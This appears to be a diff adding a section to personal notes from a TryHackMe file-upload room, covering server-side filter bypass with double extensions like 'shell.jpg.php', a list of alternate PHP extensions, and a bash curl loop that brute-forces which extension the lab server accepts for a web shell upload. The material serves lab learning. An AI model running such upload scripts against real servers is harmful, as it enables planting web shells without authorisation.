@@ -72,4 +72,63 @@ b) The POST request sent to the server, enabling the removal of client-side filt
 
 ### Bypassing server-side filtering
 
-...
+1. Presence of valid file extension anywhere within the filename (whitelist)
+
+Eg. Given that the the only valid file extension is `.jpg`. A list of valid filenames can be the following: `shell.jpg.php`, etc.
+
+
+
+2. Uncommon file extension for the same filetype (blacklist)
+
+Refer to the sub-page named: _**File extension cheat-sheet**_.
+
+
+
+### Examples
+
+Eg.
+
+> Task 8 of the _tryhackme.com_ practice room (link provided at the top)
+
+This challenge requires the combination of method 1 and 2 discussed above (\*\*TO CONFIRM).
+
+`php-ext.txt`
+
+```
+.phtml
+.php3
+.php4
+.php5
+.php7
+.phps
+.php-s
+.pht
+.phar
+
+```
+
+```sh
+#!/bin/bash
+
+file="php-ext.txt"
+while IFS="" read -r cur;
+do
+	if [[ -z "$cur" ]]; then
+		continue
+	fi
+
+	res=$(curl http://annex.uploadvulns.thm -H "Host: annex.uploadvulns.thm" -F "fileToUpload=@shell.jpg$cur;type=application/octet-stream" -F "submit=Upload" -s -o /dev/null -D - | grep 'location')
+
+	# alternatively,
+	# if [[ "$res" == *"/?submit=success"* ]]; then
+	if echo "$res" | grep -q "/?submit=success"; then
+		printf "FOUND: $cur"
+		exit 0
+	fi
+
+done < "$file"
+```
+
+Output: `FOUND: .php5`
+
+The accepted PHP shell script filename is `shell.jpg.php5`.
